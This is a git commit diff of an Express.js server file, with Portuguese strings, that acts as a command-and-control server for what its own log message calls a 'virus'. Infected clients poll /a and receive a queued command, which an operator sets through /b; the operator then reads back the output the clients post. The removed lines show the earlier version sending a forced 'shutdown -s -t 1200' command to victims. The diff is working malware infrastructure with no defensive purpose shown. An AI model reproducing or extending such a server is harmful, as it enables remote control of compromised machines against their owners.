9ad7441fceefbb51549a513822800daee927dfd6
Rafark123 <zumbidoalasca@gmail.com>
2022-03-06 15:30:52 -0300

    commit

--- api.js
+++ api.js
@@ -1,12 +1,28 @@
 const express = require('express');
 const app = express();
-
+let a = 'nada'
+let b
 app.use(express.json({limit: "50mb"}));
 app.use(express.urlencoded({limit: "50mb", extended: true, parameterLimit:50000}));
 
 app.post('/a', (req, res) => {
-    console.log('Estou Aqui')
-    res.send('shutdown  -s -t  1200')
-})
+    console.log('Virus com id: ' + req.headers.id + '   Esta Online');
+res.send(a)
+a = 'nada'
+b = req.body
+console.log(req.body)
+});
 
-app.listen(8080)
+app.post('/b', (req, res) => {
+a = req.body.text
+if(b != undefined){
+    res.send(b)
+}
+});
+
+app.get('/', (req, res) => {
+
+res.sendFile('R:\\API-Receber-Info\\index..html')
+});
+
+app.listen(8000);
